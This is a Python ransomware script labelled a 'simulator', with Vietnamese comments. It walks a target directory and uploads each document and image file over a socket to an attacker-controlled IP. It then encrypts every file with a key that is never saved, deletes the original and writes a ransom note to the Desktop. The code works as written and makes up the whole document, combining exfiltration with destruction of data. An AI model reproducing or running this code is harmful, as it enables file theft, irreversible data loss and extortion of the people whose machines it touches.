import os
import socket
import json
from cryptography.fernet import Fernet


class RansomwareSimulator:
    def __init__(self, directory, server_host, server_port, file_extensions):
        self.directory = directory
        self.server_host = server_host
        self.server_port = server_port
        self.file_extensions = file_extensions
        self.key = Fernet.generate_key()

    def send_file_to_server(self, file_path):
        try:
            with open(file_path, 'rb') as file:
                file_data = file.read()

            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(10)  # Set timeout for the connection
                s.connect((self.server_host, self.server_port))
                message = {
                    'filename': os.path.basename(file_path),
                    'content': file_data.decode('latin1', errors='ignore')
                }
                s.sendall(json.dumps(message).encode('latin1'))
                print(f"Sent file: {file_path}")
        except Exception as e:
            print(f"Error sending file {file_path}: {e}")

    def find_and_encrypt_files(self):
        print("Scanning directory for files...")
        for root, _, files in os.walk(self.directory):
            for file in files:
                if any(file.endswith(ext) for ext in self.file_extensions):
                    file_path = os.path.join(root, file)
                    self.send_file_to_server(file_path)
                    self.encrypt_file(file_path)

    def encrypt_file(self, file_path):
        fernet = Fernet(self.key)
        try:
            with open(file_path, 'rb') as file:
                original = file.read()
            encrypted = fernet.encrypt(original)

            encrypted_file_path = file_path + ".encrypted"
            with open(encrypted_file_path, 'wb') as encrypted_file:
                encrypted_file.write(encrypted)

            os.remove(file_path)
            print(f"File encrypted: {encrypted_file_path}")
        except Exception as e:
            print(f"Error encrypting file {file_path}: {e}")

    def create_ransomware_message(self):
        message = "Máy tính của bạn đã bị Ransomware.\nHãy liên hệ với chúng tôi để giải quyết."
        desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
        message_file = os.path.join(desktop_path, "RANSOMWARE_WARNING.txt")

        try:
            with open(message_file, 'w', encoding='utf-8') as file:
                file.write(message)
            print(f"Ransomware warning created at: {message_file}")
        except Exception as e:
            print(f"Error creating ransomware message: {e}")


if __name__ == "__main__":
    # Cấu hình mục tiêu
    file_extensions = ['.txt', '.docx', '.jpg', '.jpeg', '.pdf', '.png']  # Các định dạng cần xử lý
    directory = 'C:\\path_to_target_directory'  # Thay bằng thư mục mục tiêu
    server_host = '192.168.100.217'  # IP của máy tấn công
    server_port = 12345  # Port của máy tấn công

    simulator = RansomwareSimulator(directory, server_host, server_port, file_extensions)

    # Kích hoạt ransomware
    print("Creating ransomware warning...")
    simulator.create_ransomware_message()  # Tạo file cảnh báo
    print("Finding and encrypting files...")
    simulator.find_and_encrypt_files()  # Quét và xử lý các file
    print("Operation complete.")
